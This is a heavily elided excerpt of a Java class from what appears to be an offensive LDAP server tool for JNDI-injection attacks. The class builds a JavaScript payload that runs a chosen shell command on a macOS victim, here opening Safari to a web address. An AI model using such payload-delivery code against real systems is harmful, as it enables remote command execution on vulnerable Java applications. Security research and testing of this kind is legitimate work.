...
import ldap.annotations.LdapMapping;
...
import static ldap.Utilities.makeJavaScriptString;
import static ldap.Utilities.serialize;
 ...
 * @author artsploit
 */
@LdapMapping(uri = { "/o=macos" })
public class MacOs implements LdapController {
    ...
    String payload = ("{" +
            ...
            "}")
            .replace("${command}", makeJavaScriptString("open -a Safari http://www.lge.com"));
